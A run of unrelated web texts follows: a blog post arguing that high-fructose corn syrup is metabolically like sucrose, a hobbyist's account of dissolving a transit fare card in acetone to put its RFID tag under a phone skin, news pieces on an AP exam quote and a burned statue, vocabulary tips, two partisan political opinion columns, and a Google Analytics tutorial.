Now , a lot of the silliness , especially in the fitness world about HFCS probably comes out of two factors .
The first is a generally anti-fructose , anti-fruit idea that started about 30 years ago with John Parillo .
For absolutely absurd reasons , fruit is often considered forbidden during a contest diet .
Nevermind that it helps a LOT of people with hunger ( liver glycogen status is one of many signals to the brain ) and seems to do something good for thyroid status for many people .
Parillo said it slowed down fat loss or even caused fat gain and the lore remains .
The second is a general confusion about what HFCS actually is , the problem is with the name , the “ high fructose ” part of it suggests to people that HFCS is much higher in fructose content that it actually is .
However this is not the case as the chart below shows .
The percentage of either fructose or glucose is shown for each of the types of sugars .
As the chart clearly shows , HFCS - 42 is only 42 % fructose which is a LOWER fructose content than straight sucrose , invert sugar or honey ( often considered “ healthier ” at least in hippie / health food subcultures .
In contrast , HFCS - 55 is 55 % fructose meaning it contains 5 % more fructose than the other sugars .
To put this in perspective
50 grams of HFCS 42 would contain 21 grams of fructose
50 grams of sucrose , invert sugar or honey would contain 25 grams of fructose
50 grams of HFCS 55 would contain 27.5 grams of fructose
That ’s a whopping 2.5 grams more fructose than straight table sugar .
It ’s worth noting that there are products such as HFCS - 80 and 90 which contain 80 and 90 % fructose but they are n’t used widely commercially so I wo n’t consider them further .
The point being that despite its name , high fructose corn syrup is not functionally higher in fructose than other sugars .
The “ high fructose ” moniker is simply a very poor choice of names that has led to widespread confusion .
Correlation is not Causation
The initial “ data ” suggesting that HFCS was responsible for obesity was correlational in nature .
That is , increases in HFCS intake seemed to track .
The thing is that correlation is not causation .
Lots of silly things correlate with one another which have nothing to do with each other .
Which is n’t to say that the increasing intake of a high - calorie sugar compound is n’t likely to be a contributor to obesity .
The question is whether HFCS is somehow unique in its contribution outside of the calorie content .
As well it ’s not as if an increase in HFCS content was the ONLY change occurring in society during the time period it seemed to track with obesity .
It was one change of many .
Despite Bray ’s assertion that increases in HFCS correlates with increases in obesity , the paper points out that he looked at the relationship in isolation .
During the time that HFCS intake was going up , daily food intake was also increasing , by about 500 calories per day from 1980 to the year 2000 .
That alone would predict increased rates of obesity regardless of HFCS per se .
Additionally , intake data shows that total sugar intake did not increase over that time frame .
As HFCS intake was going up , sucrose intake was going down .
Rather , what people were eating more of were grains and dietary fat .
There is simply no basis to conclude that increasing HFCS intake has any correlation with rising rates of obesity per se .
Is High Fructose Corn Syrup Sweeter than Sucrose
It ’s often claimed that HFCS is sweeter than sucrose , the logic being that the sweet flavor will increase intake .
But this is also untrue .
While pure crystalline fructose IS sweeter than sucrose , HFCS is identical in sweetness .
Increasing use of HFCS in the US food supply did not increase the relative sweetness of those foods .
Note : pure fructose is rarely consumed outside of hippy subcultures who believe it ’s healthier .
As importantly , consuming LARGE amount of fructose causes stomach upset .
Part of the entire HFCS debate went off the rails by focusing on the fructose itself .
Zillions of studies giving pure fructose were done , often using absurd amounts which have no basis in real life .
But people simply do n’t eat pure fructose by and large .
Importantly , both high fructose corn syrup and sucrose contain 4 calories / gram .
In that sucrose appears to have been swapped out for HFCS in a more or less 1:1 ratio , there is no reason to believe that HFCS intake is increasing caloric intake outside of simply being a source of calories .
Does the Metabolism / Absorption of HFCS Differ from Sucrose ?
Finally , the paper looks at the issue of absorption and metabolism of sucrose vs. HFCS .
While fructose is metabolized differently than glucose ( in terms of the transporters used and how it is handled in the liver ) , keep in mind that HFCS is only about half - fructose , just like sucrose .
Fructose malabsorption is a problem , mind you , but only when large amounts of fructose by - itself is consumed ( as above this is rare ) , this does not apply to HFCS .
Quoting from the paper :
Sucrose , HFCS , invert sugar , honey an many fruits and juices deliver the same sugars in the same ratios to the same tissues within the same time frame to the same metabolic pathways .
Thus …it makes essentially no metabolic difference which one is used .
So , again , while HFCS is certainly a source of calories ( and many HFCS containing foods are easily overconsumed ) , there is nothing special about HFCS that makes it uniquely problematic .
Fruit juice or a sucrose containing soda would function identically in the body to a HFCS containing drink .
Is HFCS Uniquely Obesity Promoting ?
At the start of this article , I gave a list of requirements that would have to be met to show that HFCS is UNIQUELY obesity causing compared to other sugars .
Simply , they have not been met .
So what ’s going on ?
As I noted above , much of the focus with HFCS has been on the fructose component and a lot of very stupid studies have been done on the topic .
One that is making the rounds now showed that feeding rats a 60 % fructose diet for 6 months caused leptin resistance .
But let ’s reality check this .
First and foremost , a human on 3000 calories per day consuming 60 % as pure fructose would be consuming 450 grams per day .
Every day .
For six straight months ( which is about the equivalent to several years in human time ) .
Yeah , I wo n’t disagree that 450 grams of sugar per day would be unhealthy .
But fructose is not the problem here : the 450 grams of sugar per day is .
To the above I ’d add : ignoring the fact that rat studies are irrelevant , the study I linked actually did 6 months of pure fructose feeding before switching the rats to a high - fat diet .
When they were switched to the high - fat diet they gained fat .
But they actually gained NO fat on the high fructose diet .
The conclusion that HFCS causes fat gain and fat does n’t was actually contradicted by the paper itself .
Something the idiots talking about it missed .
Again , you ’re not a rat so who cares .
Let ’s further reality check it , the issue here is not pure fructose but HFCS which is only about half fructose .
To consume that same 60 % pure fructose diet would mean a diet of 120 % HFCS .
Wait , huh ?
By that I mean someone would have to consume 3600 calories ( 20 % over maintenance ) to get that much fructose .
I think you can see that this is idiotic .
As the paper states :
A pure fructose diet is surely a poor model for HFCS , because HFCS has equivalent amounts of glucose .
Because no one would eat a pure fructose diet , such experimentation must be recognized as highly artificial and highly prejudicial and not at all appropriate to HFCS .
Rather , diets examining sucrose intake make a much more appropriate model for HFCS .
Not much has been done comparing HFCS to sucrose but what has been shows no metabolic difference between the two .
And in a physiological , biochemical and nutritional sense , this is to be expected .
HFCS and sucrose are essentially identical .
And the body treats them as such ( though for some hilarity read some of the idiot level comments on this article ) .
Does HFCS Intake Predict Either US or Global Obesity ?
In a word , no .
While Bray ’s original analysis suggested a correlation between increasing HFCS intake and US obesity , that relationship no longer holds .
HFCS intake has been decreasing in the past year yet obesity continues to increase .
Not only is there no biological reason to expect HFCS to uniquely cause obesity , it ’s no longer even correlational with it .
Moving to the global arena , there is simply no relationship between HFCS intake and obesity rates with the two countries showing the highest rates of obesity showing the lowest intake of HFCS .
The correlation never mattered to begin with .
Now it does n’t even exist .
Will Eliminating HFCS from the Food Supply Affect Obesity ?
You can probably guess the answer which is no .
Given that HFCS and sucrose are nearly identical in composition , given that HFCS has replaced sucrose intake in the human diet over the past 30 years , given that they are handled metabolically identically , given that they have the identical caloric value , replacing HFCS with sucrose will simply have no effect on anything .
Except perhaps to raise prices since sucrose is higher than HFCS .
What Do We Do with this Information ?
Now , since I know some people will mis-interpret this piece , I want to be clear : the paper I examined is NOT saying that people can or should be consuming HFCS in massive amounts .
Many HFCS containing foods contain massive numbers of calories .
The problem is n’t the HFCS per se , it ’s the calorie content .
Of some interest , a large amount of HFCS is consumed in sweetened soda .
This is interesting because , unlike foods , beverages are not well compensated for by the body .
By that I mean that increasing calorie content in fluids does n’t cause the body to reduce food intake at other times .
When you add calorie containing drinks ( except for milk ) to the diet , you increase calorie content .
So IF HFCS has any direct effect on obesity , this is it .
But it has nothing to do with HFCS and everything to do with the liquid form .
Sucrose containing soda or fruit juice has an identical effect .
I ’d add more to this .
Obesity is multi-factorial and many eating habits tend to cluster together .
I want everyone reading this to do a little thought experiment : when you have known someone who consumes a LOT of sugary soda , what does the rest of their lifestyle look like ?
If you said “ Well they are usually inactive and eat a lot of high - calorie , high - fat , high - sugar foods ” you ’re going to be correct more often than not .
Is HFCS the issue or is it the fact that people who consume lots of HFCS containing sodas have an overall poor diet and lifestyle the issue ?
What I ’m getting at with this research review is that the near insane over - reaction and concern to any food containing any amount of HFCS among certain groups .
Folks on forums are throwing out the baby with the bathwater under the gross misunderstanding that HFCS per se is a unique evil which it clearly is n’t .
Within the context of a calorically controlled diet , there is no reason to believe it will have any differential impact beyond every other sugar that has ever been used .

LONDON , May 20 ( Reuters ) – European shares were sharply lower at midday on Thursday , extending the previous session ’s steep fall , on persistent concern other euro zone countries will follow Germany in banning short selling in certain instruments .
Except that ’s not exactly what happened in September 2008 :

I ride the T every work day , and most weekend days , and for all that I complain about how it could be better , I love being able to do most of my getting around on trains and buses .
I do n't , however , love having to keep track of my Charliecard , not specifically because ofbut just because I have so many little bits and pieces of life I have to carry around every day : Charliecard , phone , wallet , keys , etc .
Sometimes , I 'd like to be able to leave the house with , say , JUST my phone and my keys .
But Iwant my Charliecard with me , because , hey , I never know when I 'm going to want to hop on a bus and go somewhere interesting .
Would n't it be nice if my phone could be my T pass ?
Well , I realized , there 's no reason itbe .
So I tried sticking the card under the skin I had on my phone , but it turns out the card is too big and bulky and is too stiff to conform to the shape of the phone .
Rats .
Except !
I do n't need the whole card , right ?
Just the RFID tag and antenna .
So I set out to do that .
I needed a Charliecard , a non-plastic container , and some acetone : ETA : It 's a good idea to make a note of your Charliecard number before you destroy it .
I just put it in as a memo in my phone .
I 've never needed the number of my card before , but it would annoy me to find that suddenly I did and could n't retrieve it !
I used way more acetone than I really needed ; just enough to cover it would be plenty :
Then , I waited .
I do n't know why I expected this step to take a couple of hours , but within a couple of minutes , the card looked like this :
And after about 20 minutes , it looked like this :
So I swished it around and plucked out the important part :
At this point , I wanted to be sure it would still work , so I tucked it into my book and brought it along on my commute the next day .
I tapped it on the fare machine as if to load it up with money , and lo and behold !
It worked !
So I put my July pass on it , and brought it back home to stick it under the new skin for my phone :
ETA : Thanks to , I now have a photo of the finished product :
Because I just have a protective skin , rather than a case , you can tell there 's something underneath , but not in a problematic way .
At the point that you just have the RFID hardware , though , you could do any number of things with it , whether put it inside a skin or case for your phone , or apparently kids in London make bracelets out of it .
For me , the cell phone / T pass combination is ideal .
I 'm so excited !
Feel free to share this around with anyone you think might find it useful for inspiring .
Also , I have a lot of leftover acetone if anyone needs any ...
Nearly 2 million high school students worldwide are taking Advanced Placement tests this May , hoping to impress college admissions counselors with high scores and , perhaps , earn a few college credits .
But one test question citing the late Palestinian - American scholar and activist Edward Said on the theme of exile is prompting protests from some Jewish students .
Image by courtesy of alyssa blumen ...
Tested : High school senior Alyssa Blumenthal co-created a Facebook group to protest the inclusion of the Said quote .
The English Literature and Composition test , in which the question occurs , requires students to read excerpts of poetry and prose and compare them to other works they have studied in class .
The passage from Said contains no reference to Palestine or Israel .
But the test ’s description of the late Columbia University humanities professor as a “ Palestinian American literary theorist and cultural critic ” has led some pro-Israel students to object that the test has been politicized .
“ I was really startled to see that quote because both of the practice questions did n’t mention the writers ’ nationalities , ” said Ayelet Pearl , a senior at New York ’s Bronx High School of Science .
“ For me including this one clearly had political implications . ”
The Said quote on the AP test reads : “ Exile is strangely compelling to think about but terrible to experience .
It is the unhealable rift forced between a human being and its native place , between the self and its true home : its essential sadness can never be surmounted . ”
“ I ’m in a public school and most students here have the impression that Israel is the one attacking [ the Palestinians ] , ” the 17 - year - old Pearl said .
“ To put a quote in like this subconsciously reinforces the idea that Israel ’s the antagonist , the aggressor , the one in the wrong . ”
Though she had just 40 minutes to write the required essay , Pearl froze when she encountered the Said text .
“ I did n’t know what to do because I was n’t comfortable answering it , ” she said .
She decided to put a paragraph objecting to the quote ’s inclusion at the top of her essay .
“ I find it really inappropriate to put a political question like that on a test , ” she said she wrote .
Using this quote in the AP exam “ is very reflective of the widespread use of education and testing as a platform for anti-Israel propaganda , ” she told the Forward .
The College Board , which develops and administers the Advanced Placement exams , requires test - takers to pledge not to discuss test questions for 48 hours after taking the assessment .
Two nights later Pearl began an open Facebook protest group , called “ Protest the 2010 AP English Literature and Composition Free Response Question . ”
As of press time the Facebook group had attracted 493 members , many of whom were engaged in lively discussion of the issue .
College Board spokeswoman Jennifer Topiel told the Forward , “ We have heard no concerns about this exam question , which contains a quotation about exile and does not contain any political subject matter . ”
Pearl and her Facebook protest group co-creator Alyssa Blumenthal , a senior at Long Beach High School in Long Beach , N.Y. , said they had not yet contacted the College Board directly .
Said , who was born in Jerusalem , was raised there and in Egypt .
He went on to become a professor of English and comparative literature at Columbia University from 1963 until his death in 2003 .
His 1978 book “ Orientalism ” is a touchstone for the field known as postcolonial studies .
Controversial both as a writer and as a political activist , Said for decades campaigned for Palestinian statehood but was often at odds with Palestinian political leaders .
In a much - discussed incident in 2000 , Said was photographed hurling a stone from Lebanon into Israel — at Israeli soldiers , some witnesses claimed , though Said and other witnesses denied this .
Blumenthal stressed that she objected to the identification accompanying Said ’s quote about exile , not the text itself .
It was , she said , more detailed than the identifications of other authors , if they were even described at all .
“ It creates a bias that can potentially make students feel very uncomfortable and make their ability to respond [ to the test question ] feel compromised , ” the 16 - year - old Blumenthal said .
“ We do n’t feel that a standardized test should be the place for anything dealing with politics regardless of the stand being taken . ”
Another College Board spokeswoman , Sheila Jamison , responded , “ The characterization of AP exam questions as typically excluding nationalities of writers quoted is not accurate .
In fact , it is typical that when an author is cited their heritage is cited .
The sample AP Exam questions demonstrate this . ”
In fact , the other five writers quoted in the free response section of this year ’s AP English Literature and Composition exam — now posted on the College Board ’s website — are listed simply by name .
The most recent example available of an author being listed with more than a name goes back two years , to the 2008 version of the test , which describes Anita Desai as an Indian author .
Some 1.8 million students worldwide are taking the 30 different AP tests currently offered this spring , on subjects ranging from art history to statistics .
“ We are n’t sure whether others have ever used Facebook to register opinions about AP exam questions , ” said Jamison of the College Board .

1 ) Read !
Reading is one of the best ways to ameliorate your vocabulary .
Processing words contextually will give yourself a chance to figure out the meaning of a word before looking it up .
This sort of guess work will create associations in your mind for new words that will help with recollection .
The necessary contextual scale is small to glean value .
Just one sentence can provide enough valuable context , so if you are not up for starting a new novel , look to magazine and newspaper articles , get a subscription to Time of Newsweek , or read articles online .
2 ) Cure your “ word blindness . ”
Often times , the specificity of a definition may differ slightly from the one you perceive and you may be missing subtleties and underlying meaning .
I call this “ word blindness ” and would recommend looking up words even if you think you know their meanings .
There were a number of words I had never looked up with which I had formulated my own definitions that turned out to have totally different meanings .
An example that comes to mind is the word ‘ noisome . '
Prior to discovering its true meaning , I just associated it with loudness and other ambiguously negative connotations , totally unaware of its “ morally hurtful or noxious ” implications .
3 ) Engage in word games such as Scrabble and Boggle .
These kinds of games will help you practice words you have learned and aid you in discovering new vocabulary .
Yahoo games has a great multi-player version of Scrabble that can be played online called Literati .
They also have a licensed version of Boggle that is very fun and other word games that are helpful as well .
These games are all free and can be found in the Yahoo Word Games section here .
4 ) Keep a list of words you come across that you do n’t know .
WordStash.com has a great tool for this ( shameless plug ) .
The key to remembering words is repetition , so having a list of words that you are learning is useful in that you can periodically review it .
Which leads to …
5 ) Periodically review words that you are learning .
The key here is periodic .
It ’s best to allow time for the definitions to sink in before reviewing them again .
A nights sleep is a great spacer .
Your brain handles a lot of it ’s upkeep during your sleeping hours , which includes filing away new word definitions .
A good time to review your word list right before you go to bed .
That way , the words are fresh in your mind , which will allow easier filing access for your subconscious .
6 ) Use flash cards .
Flash cards are a great tool for learning words in that they provide easy access to word definitions .
Put them in places that will remind you to review , such as next to your bed .
You can also create flash cards using post - it notes for more placement options .
7 ) Do crossword puzzles .
Crossword puzzles challenge your word skills in ways like no other .
It is truly rewarding to solve a clue with a word you have just learned .
A great source for crossword puzzles online is at BestCrosswords.com .
It has an intuitive interface and you can save your puzzles .
The free version can be found in the Casual Interactive section here .
8 ) Watch Jeopardy .
Jeopardy always has a number of word related clues .
It can be great practice to showcase words that you have learned and also find new and interesting words .
I have started a list of vocabulary from Jeopardy on WordStash that covers about a week of so of episodes here .
9 ) Utilize a dictionary search plugin .
Whatever your go to dictionary may be , make sure you have a search plugin that will allow simple and fast definition access .
It is important to be able to retrieve definitions as fast as possible so you do not get lazy and go on without correcting your word blindness .
10 ) Use mnemonics .
According to Wikipedia
“ A mnemonic device is a mind memory and / or learning aid .
Commonly , mnemonics are verbal — such as a very short poem or a special word used to help a person remember something — but may be visual , kinesthetic or auditory . "
Mnemonic devices are perfect for remembering vocab .
Some examples : for the word ' tenacious ’ , picture a house of cards with ' ten aces ’ holding together , or for ' fortuitous ’ picture two lost cowboys trying to find ' Fort Uitous ’ .
They flip a coin to choose their direction and find it , fortuitously …
Lightning and a subsequent fireball Monday night destroyed a 62 - foot - tall " King of Kings " statue of Jesus with arms stretched toward the skies , the Cincinnati Enquirer reports .
The only thing visible this morning is the charred frame of the plastic foam and fiberglass statue , the newspaper says , citing police in Monroe , Ohio .
" It burned to the ground .
The whole statue is gone , " said Kim Peace , a police dispatcher .
" Touchdown Jesus , " as it is known locally because of the outstretched arms , has been a Butler County landmark along I - 75 since it was erected in 2004 outside Solid Rock Church .
The Enquirer carried on its website a YouTube video , below , of the statue aflame , albeit accompanied by an offbeat soundtrack .

Iceland Or Mordor ?
Lets play a little game .
Try to figure out which of the following are photos taken in Iceland this week , and which are pictures of Mordor from Lord of the Rings .
At long last , the ASUS Eee Pads have arrived , but unfortunately they 're just not working the way we 've been imagining for all these months .
We got a few minutes to toy around with the 10 - inch EP101TC and 12 - inch EP121 , but both were barely working .
And " barely " is being gracious .
We can tell you that both models are incredibly well built -- they 've got aluminum edges and matte back covers -- and neither was particularly heavy .
The EP121 was n't booting at all , but it was being shown off with a super sleek keyboard docking station , which will be used to turn the tablet into an ultraportable laptop of sorts .
An NVIDIA Tegra - powered EP101TC was powering on , but its Windows Embedded Compact 7 - based interface was still noticeably buggy , and the touchscreen quite unresponsive .
The UI certainly looked attractive enough , and our swipe motions across the capacitive touchscreen were handled admirably , but ASUS definitely has a ways to go in terms of functionality .
We wish we had more impressions to share , but it looks as if we 'll have to wait for a less half - baked iteration to really dive in .
' Til then , feel free to peruse the gallery below and peek the video just beyond the break .
As most of you probably know , today is an off - day for our dear players , as the buildup for the World Cup …
Before the tar balls had a chance to touch down on the white sands of the Gulf Coast – the message from the oil - soaked Republican Party was clear : “ Do n’t exploit the disaster … if you ’re a Democrat . ”
But if you ’re a member of the GOP , feel free to exploit this endless spill for political gain .
Use it as a battering ram against the president .
“ Obama ’s Katrina . ” “ Obama un - American for criticizing BP . ”
“ The moratorium is worse than the spill . ” “ Obama is n’t doing enough . ”
“ Government is bad – where ’s the National Guard ? ”
So on and so forth .
But do n’t try to pass an energy policy in the wake of the biggest environmental catastrophe this country has ever witnessed .
That ’s exploitive .
Crude .
The “ do n’t exploit this tragedy ” knee - jerk catch - all phrase is absolutely meaningless .
In American politics , we rule by crisis .
There is no political will to act unless something is burning , melting or spewing .
We do n’t plan for the future – we brace for it .
Our policies are all emergency - based .
Our country is like someone who wo n’t pay their bills until they get a shut off notice .
“ We can wait no longer !
Now is the time ! ”
The Republican ’s hands - off philosophy back when they held all three branches of government enabled a horde of deregulated industries with imaginary blow - out preventers to burst : the banks , Wall Street , the auto industry , the housing market etc .
We ’ve had to attend to these disasters , one after another .
Tipping point after tipping point .
Cliff after cliff .
The one issue Obama did address when it was only slightly gangrene was health care .
Yet this is also the issue he gets criticized for doing instead of mopping up the Armageddon - of - the - month .
Appointed Arizona Governor Jan Brewer enjoys exploiting a tragedy to defend her disastrous - to - civil - rights immigration law .
Have any Republicans admonished her for it ?
Nope .
It ’s a showdown – and Obama is IGNORING the crisis !
Even though most statistics admit both incidents of violence and illegal immigration at the border had already declined .
Even though “ securing the border ” is as ambiguous and unobtainable as “ wiping out terror . ”
Even though according to Arizona Republic , the Customs and Border Protection , the federal law enforcement agency has an annual budget of $ 17 billion , doubling what was spent in 2003 .
“ I have repeatedly sent letters to the administration and to the president of the United States with absolutely no response , ” Brewer said on Fox News .
It ’s like calling your elderly relative just to have them bark at you that you never call .
I ca n’t imagine why Brewer would get ignored .
But if a perennial progressive issue turns into a crisis – tragedy is suddenly sacred .
A mass shooting at a school ?
Do n’t exploit this tragedy to talk about gun control .
Miners killed due to hazardous conditions ?
Do n’t exploit this tragedy to empower unions .
Our Gulf Coast lost for a generation because of drilling shortcuts ?
Do n’t exploit this dead gulf or you ’ll kill jobs .
The point is : Obama should exploit this tragedy in the Gulf .
Not “ exploiting the tragedy ” is saying the status quo is perfect .
Do n’t do anything .
Just wait out the clock .
Yes , just like the “ actions ” of the 109th Congress – the last one controlled by Republican majorities in both houses .
When the Republicans set the agenda , they met a whopping 242 days in two years , which was 12 fewer days than the 80th Congress , the first to be dubbed a Do-Nothing Congress by President Harry Truman .
The 109th had an average of eight months off a year – because nothing celebrates government ineffectiveness more than a gig in Congress being a nearly no - show job .
“ But if we seize this moment we can rebuild our economy on a new foundation , ” said President Obama on his Organizing for America site thisweek .
Please , exploit this crisis .
Make it the reason a spill like this wo n’t happen again .
“ The only real solution is to take American ingenuity to get energy in different forms , ” Microsoft ’s Bill Gates said on NBC ’s “ Meet the Press . ”
Gates proposes spending one percent ( $ 11 billion annually ) of what we spend on energy for research and development .
Finally an idea , not just a denial with a chant .
“ Drill , baby , drill . ”
Yes .
Exploit this crisis and exploit the clean renewable natural resources inspired by Bill Gates – the country ’s nerds .
Yes , this third wave is complicated .
But at least it ’s interesting .

The establishment is in full blown panic over the runaway success of Kentucky primary winner Rand Paul and has set about attacking the son of Congressman Ron Paul from every conceivable angle in an attempt to undermine his support base and ensure his defeat by a Democratic opponent in November .
Whatever your personal agreements or disagreements with the nuances of Paul ’s policies , the fact is that he represents the rarest breed of politician – one not controlled by special interests – and that is a fundamental threat to the status quo and the gravy train for the crooks and scoundrels in Washington DC .
On the one hand , establishment neo-con news organs like the New York Daily News have attempted to eviscerate Paul ’s Tea Party base by implying that he is not “ conservative ” enough in that he does n’t support endless unconstitutional wars of aggression that have not been authorized by Congress .
Of course , classical conservatism of the George Washington , founding fathers variety , dictates that foreign policy should be based around a strong national defense while avoiding foreign entanglements and interventionism – which is exactly what Rand Paul embraces .
So the sight of the neo-cons trotting out the universally loathed Dick Cheney – he had the lowest approval ratings for any Vice President in recent history – to back Paul ’s opponent Trey Grayson was a pathetic effort to characterize Paul as being soft on foreign policy , a tactic that went out of date some five years ago , and its failure was evident in the size of Paul ’s crushing victory .
Establishment neo-con Republicans have to know that the game is up .
Unless they can completely take over and subvert the Tea Party movement , which they have openly called for , it ’s all over for them .
The fact that the Tea Party got right behind Paul despite his openly stated desire to bring the troops home proves that neo -con sentiment within the ranks of the Tea Party is on the wane .
Conservatives are finally starting to understand that unconstitutional foreign wars of aggression are not conservative .
A d v e r t i s e m e n t
{openx:49}
On the flip side of the rigged political spectrum we have the neo - libs crying foul about Paul ’s libertarian credentials .
Despite the fact that Paul has vehemently supported his father ’s stance of shrinking big government , legalizing marijuana and ending the drug war , putting a stop to banker bailouts , reducing the national debt , lowering taxes , and restoring personal liberties , just because Paul has n’t explicitly supported gay marriage , this invalidates everything else according to this warped and myopic argument .
In reality , the issues of abortion and gay marriage have always divided libertarians into socially conservative and socially liberal camps .
Rand Paul believes that one of the few roles of government should be to protect life , which he believes begins at conception .
Just because Paul does n’t believe that individual freedom should give people the freedom to kill their own children does n’t make him a neo-con .
While people who profess to be libertarians may grandstand with righteous indignation and attack Paul for his stance on abortion in the belief that they are performing some kind of moral duty to “ expose ” him as a neo -con , in reality they are only doing the bidding of the establishment in acting as the left - wing of the pincer attack on the Senatorial candidate ’s support base .
The establishment does not care from which direction the mud is thrown at Rand Paul – so long as some of it sticks – which is why they will continue to desperately try to undermine him before the elections in November , while still failing to grasp that real populist candidates who resonate with the burgeoning resistance to big government are all but immune to such smears .
Aided by helpful attacks from both sides , Democrats are apparently “ giddy ” about taking on Paul come November , but so long as the Senate contender sticks to his core principles , he should have little problem in seeing off an opponent who will be unable to extricate his campaign from the plunging popularity of Barack Obama and the big government agenda that he fronts for .
“ I say bring it on , ” Rand Paul shot back yesterday .
“ Please bring President Obama to Kentucky , bring him to campaign as much and as often as they can because he ’s incredibly unpopular here , the Democrat policies are incredibly unpopular here – so I say bring it on . ”

As recently as a month ago I was a victim of a state of mind I call Analytics Dismissal Disorder .
This mindset is common after hearing about the importance of analytics , installing the tracking code and then getting overwhelmed by all of the graphs and scary numbers .
When I suffered from analytics dismissal disorder ( which my doctors called A.D.D. for short ) , I knew Google Analytics was important but avoided the extra effort necessary to learn how to get the most out of the software .
This post explains what I needed to learn to get over this .
After learning the basics of Google Analytics , you can learn interesting facts like what search terms people use to find your website .
In this case , web searchers are more interested in fat people falling than they are in me .
Here is the problem with Google Analytics :
It is obviously potentially useful but who has the time to study how to use a product .
I do n’t even read the text - less IKEA manuals so why would I read documentation for software .
Sounds boring .
This all changed when SEOmoz offered to pay for me to go to WebShare ’s Google Analytics Seminar ( Wait , you are paying me to leave the office ?
Mission Accomplished ) .
This 16 hour class walked me through Google Analytics and pushed me through the massive learning curve .
This post distills what I learned in those 16 hours of employer - paid - learning into something you can understand and act on in 20 minutes .
Nerd High Five !
( * Pushes up glasses * )
Overcome the Google Analytics Learning Curve in 20 Minutes :
An actionable guide to learning what you need to know about Google Analytics .
First Things First :
What are Accounts and Profiles and how are they different ?
When you first log in to Google Analytics you need to navigate to your desired data set .
This is much more confusing than it ought to be .
Accounts are like folders on a computer .
They can contain a lot of different files ( profiles ) and serve mostly just for organization .
An example of an account might be Work Websites or Personal Websites .
( Be forewarned , this is not intuitive on setup .
Do n't make the mistake I did and name an account after a website .
That naming convention is more appropriate for a profile ) .
Profiles , on the other hand , are like files on a computer .
They can't contain additional profiles or accounts .
They represent one view of a website ( although not necessarily the only view ) .
An example of a profile might be api.seomoz.org or SEOmoz minus Office IP addresses .
You can limit a profile to whatever view of a website you want by using filters .
What are Filters and Segments and how are they different ?
This is also more complicated than it ought to be .
( grrr )
Filters are attached to website profiles ( i.e. " SEOmoz minus office IP addresses " ) and are permanent .
If a profile includes traffic data from all IP addresses except SEOmoz 's office computers , there is absolutely no way to reinclude this excluded data in the given profile at a later time .
Filters are irreversible and kinda mean ( thus the anal in Google Analytics ) .
You can set them up on the profiles page .
( See Below )
Segments are similar to filters except they are profile agnostic and their effects are temporary .
In addition , they can be compared against each other .
The example segments below shows all visitors ( blue line ) , new visitors ( orange line ) , and returning visitors ( green line ) and their distribution on the top content of the given website .
What are " raw " profiles and why use them ?
( Ctrl + Z wo n’t save you here )
Google Analytics is different from other Google products in that it does n't provide a way to undo certain types of data processing ( i.e. filters ) .
In order to give you freedom to explore ( and potentially ruin ) your profiles , it is important that you create an unfiltered ( raw ) profile of your website that you can use in case something goes wrong with one of your other profiles .
In SEOmoz 's case , this profile is literally called " Do Not Touch ! Backup Profile " .
This is the backup profile we will use to get historical data when Joanna Lord screws up our other profiles .
( Danny ! )
What if I do n't trust a specific metric ?
Tough beans !
The key to getting the most out of Google Analytics is to trust it .
This is very similar to how we measure time .
We all know that our bedroom clock is probably not exactly synced with our office clock but we trust each time - peice as close enough .
You need to make the same leap of faith for Google Analytics .
The metrics might not be 100 % accurate all of the time , but like a clock , at least they are consistent .
This makes Google Analytics metrics good enough .
( And quite frankly it is as accurate as all of its competitors )
Navigating Google Analytics :
Google Analytics Navigation
Dashboard ( Mostly Useless High - level Metrics )
As you would expect , the dashboard shows you the high - level status of your website .
The problem is that these metrics tend not to drastically change very often so if you keep looking at your dashboard , you wo n't like see any big changes .
ZzzzzzzzZZZzzzzz .
Real analytics pros do n't let friends rely on the default dashboard stats .
Intelligence ( Automated e-mail alerts ) - Check Monthly
Intelligence is Google 's confusing name for automatic alerts .
Did traffic to your homepage jump 1000 % over last week ?
Are visits from New Zealand down 80 % from yesterday ?
Intelligence alerts will , with your permission , e-mail you if anything unexpected happens on your website .
Visitors ( The type of people that come to your site ) - Check Monthly
As the name implies , this section reveals information about your visitors .
Want to know what percentage of your users have Flash enabled or how many people viewed your website on an iPad ?
This section will tell you .
( Long live Steve Jobs ! )
Traffic Sources
( Where people are coming from to reach your site ) - Check Weekly
This section shows you different reports on the sources that drove you traffic .
Content ( Metrics on your pages ) - Check Weekly
Whereas , Traffic Sources shows you information about other people 's pages as they relate to yours , the Content section only shows you information about what happens on your pages .
Goals ( Metrics on whether or not people are doing what you want them to do ) - Check Daily
Goals are predefined actions on your website that you want others to perform .
It is important to note that you must configure these manually .
Google can't auto detect these .
This section shows metrics on how people completed these goals or where they dropped off if they did n't complete them .
Report Interface :
The bread and butter of Google Analytics are the reports .
These are the frameworks for learning about how people interact with your website .
Graph :
The graphs / reports in Google Analytics have 6 important options .
The first three are detailed below :
Export .
This is pretty self explanatory .
You can export to PDF , XML , CSV , CSV for Excel or if you are too good for commas you can export to TSV .

Which Reports To Track and When :
I recommend using this as a starting point and tailoring it to your needs as you learn more about the unique needs for your website .
Daily
Goals -> Total Conversions
Content ->
Top Content ( at the page level )
Traffic Sources -> All Traffic Sources
Traffic Sources -> Campaigns - ( Optional )
Weekly ( or bi-weekly if you have a content intensive website )
Goals -> Funnel Visualization
Goals -> Goal Abandoned Funnels
Content -> Site Search
Traffic Sources -> Direct Traffic
Traffic Sources -> Referring Sites
Traffic Sources -> Keywords
Monthly
Visitors ->
Overview
Intelligence -> Overview
Content ->
Content Drilldown ( at the folder level )
Content -> Top Landing Pages
Content -> Top Exit Pages
Traffic Sources ->
Adwords - ( Optional )
Which Reports to Ignore :
Visitors ->
Benchmarking
From installation validation tools , it 's estimated that as many as 70 % of Google Analytics installs are either incomplete or incorrect .
This means that the data that these benchmarks rely on , is very likely inaccurate .
Visitors -> Map Overlay
While this feature is one of the most popular features of Google Analytics , it is also one of the least useful .
The data these maps present is not normalized so areas with high populations tend to always dominate the screen .
They are not completely useless as they show trends but they are not something that can be relied on heavily either .
Use your best judgement when viewing this report .
Content -> Site Overlay
This feature seems like a good idea but is not able to be implemented in a way that makes it accurate .
Put simply , in order for this tool to work , Google Analytics would need to have more information about the location of a link on a page and a mechanism for tracking which instance of a link gets clicked .
Clicktale and Crazy Egg are nice alternatives .
Conclusion :
Tracking the metrics above is only the first step .
Imagine Google Analytics as a magical yard stick ( For you sissies on the metric system , a yard stick is like a meter stick but better ) .
It is essential for measuring the success or failure of a given online strategy but it is not an online strategy alone .
It is best used as a supplement to the your current activities and should be treated as such .
I am surely going to get some flak from some Analytics gurus who know more than me .

